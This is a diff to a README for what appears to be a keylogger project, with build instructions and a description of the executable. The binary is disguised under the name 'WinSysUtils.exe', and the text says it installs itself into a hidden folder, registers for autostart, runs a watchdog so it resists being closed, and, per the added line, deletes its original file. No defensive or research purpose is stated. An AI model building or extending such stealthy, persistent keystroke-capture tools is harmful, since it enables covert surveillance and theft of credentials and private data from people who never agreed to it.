@@ -10,7 +10,7 @@ To build the project and get the executable:
 dotnet build -c Release
 ```
 
-The executable will be located at `KeyLogger\bin\Release\WinSysUtils.exe`. When run, it will automatically install itself into a standard hidden folder, register for automatic startup, and start a watchdog system to prevent it from being easily closed.
+The executable will be located at `KeyLogger\bin\Release\WinSysUtils.exe`. When run, it will automatically install itself into a standard hidden folder, register for automatic startup, delete the original file, and start a watchdog system to prevent it from being easily closed.
 
 Note: `dotnet publish` is not supported for this .NET Framework 4.8 project because it uses legacy ClickOnce tasks incompatible with the .NET Core MSBuild. Use `dotnet build` instead.
 
